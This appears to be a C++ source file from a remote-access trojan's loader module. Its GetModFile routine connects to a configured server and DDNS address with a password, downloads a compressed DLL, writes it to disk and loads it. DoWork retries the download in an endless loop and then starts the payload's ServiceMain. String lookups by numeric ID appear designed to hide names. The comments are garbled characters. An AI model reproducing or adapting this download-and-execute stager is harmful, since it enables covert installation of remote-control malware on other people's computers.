// MyWorkMoudle.cpp: implementation of the CMyWorkMoudle class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyWorkMoudle.h"
#include "MyClientTran.h"
#include "Lzw.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyWorkMoudle::CMyWorkMoudle()
{
	m_gFunc.memset(m_ModFilePath, 0, sizeof(m_ModFilePath));
	hCtrMd = NULL;
	nParentThreadId = 0;
}

CMyWorkMoudle::~CMyWorkMoudle()
{

}

HMODULE CMyWorkMoudle::GetModFile(char* pFilePath, UINT nCmd)
{
	//���ӷ����������ͱ����ļ�У����
	CMyClientTran m_Tran;
	if(!m_Tran.Create(nCmd, m_DllInfo.m_ServerAddr, m_DllInfo.m_ServerPort, m_DllInfo.m_DdnsUrl, m_DllInfo.m_PassWord))
	{
		return NULL;
	}

	//�����ļ�����
	DWORD nFileLen = 0;
	if(!m_Tran.RecvData(&nFileLen, sizeof(DWORD)))
	{
		return NULL;
	}

	//�����ļ�
	BYTE* pZipFileData = new BYTE[nFileLen];
	m_gFunc.memset(pZipFileData, 0, nFileLen);
	if(!m_Tran.RecvData(pZipFileData, nFileLen))
	{
		delete [] pZipFileData;
		return NULL;
	}

	//��ѹ����
	FCLzw lzw;
	BYTE* pUnZipFileData = NULL;
	DWORD nUnZipFileLen = 0;
	lzw.PcUnZip(pZipFileData, &pUnZipFileData, &nFileLen);
	delete [] pZipFileData;
	WriteMyFile(pFilePath, pUnZipFileData, nFileLen);

	//װ��DLL�ļ�
	return LoadLibrary(pFilePath);
}

void CMyWorkMoudle::DoWork()
{
	//ctr.dll
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10233, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//ȷ������dllĿ¼
	m_gFunc.GetModuleFileName(m_ghInstance, m_ModFilePath, 200);
	char* pFind = m_gFunc.strrchr(m_ModFilePath, '.');
	if(pFind != NULL)
	{
		*pFind = 0;
		m_gFunc.strcat(pFind, m_TmpStr);
	}

	//����װ�ؿ��Ʋ��dll
	hCtrMd = LoadLibrary(m_ModFilePath);
	if(hCtrMd == NULL)
	{
		//���ؿ��Ʋ��
		while(1)
		{
			//���ع������������
			hCtrMd = GetModFile(m_ModFilePath, WM_CONNECT_DMOD);
			if(hCtrMd == NULL)
			{
				//��Ϣ�ȴ�ָ��ʱ��
				m_gFunc.Sleep(m_DllInfo.m_DelayTime);
			}
			else
			{
				break;
			}
		}
	}

	//ServiceMain
	m_gFunc.GetMyString(10198, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//��ʼ����
	SERVICEMAINPCMAIN ServiceMain = (SERVICEMAINPCMAIN) GetProcAddress(hCtrMd, m_TmpStr);
	if(ServiceMain != NULL)
	{
		ServiceMain((HWND) DLL_LOAD_FLAG, m_ghInstance, (char*) &m_DllInfo, DLL_LOAD_FLAG);
	}
	FreeLibrary(hCtrMd);

	//֪ͨ���߳��˳�
	if(nParentThreadId != 0)
	{
		while(!m_gFunc.PostThreadMessage(nParentThreadId, WM_CLOSE_CLIENT_THREAD, 0, 0))
		{
			m_gFunc.Sleep(10);
		}
	}
}


